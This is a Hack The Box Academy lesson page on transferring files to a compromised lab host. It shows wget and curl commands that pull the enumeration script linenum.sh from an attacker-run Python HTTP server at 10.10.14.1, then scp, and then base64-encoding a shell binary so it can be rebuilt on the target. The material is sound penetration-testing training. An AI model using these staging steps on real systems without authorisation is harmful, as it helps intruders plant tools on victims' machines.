<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/77/section/849
// Platform Version: V1
// Module ID: 77
// Module Name: Getting Started
// Module Difficulty: Fundamental
// Section ID: 849
// Section Title: Transferring Files
// Page Title: Getting Started
// Page Number: 12
-->

# Transferring Files

**Module Name:** Getting Started **Page Number:** 12

#### GETTING STARTED

# Transferring Files

## Using wget

``` shell-session
[!bash!]$ cd /tmp
[!bash!]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

``` shell-session
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

``` shell-session
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

## Using SCP

``` shell-session
[!bash!]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

## Using Base64

``` shell-session
[!bash!]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

``` shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

## Validating File Transfers

``` shell-session
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

``` shell-session
[!bash!]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

``` shell-session
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

####